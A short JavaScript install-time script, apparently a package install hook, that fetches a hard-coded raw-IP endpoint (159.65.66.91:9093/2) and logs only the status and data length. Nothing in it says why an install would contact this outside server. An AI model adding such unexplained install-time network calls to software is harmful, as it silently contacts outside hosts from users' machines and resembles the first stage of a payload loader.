// Install-time fetch for endpoint /2
console.log("⏳ [Install /2] Fetching http://159.65.66.91:9093/2...");

(async () => {
  try {
    const response = await fetch("http://159.65.66.91:9093/2");
    console.log("✅ [Install /2] Response status:", response.status);
    const data = await response.text();
    console.log("📦 [Install /2] Data length:", data.length, "bytes");
  } catch (error) {
    console.log("⚠️ [Install /2] Failed:", error instanceof Error ? error.message : "Unknown");
  }
})();
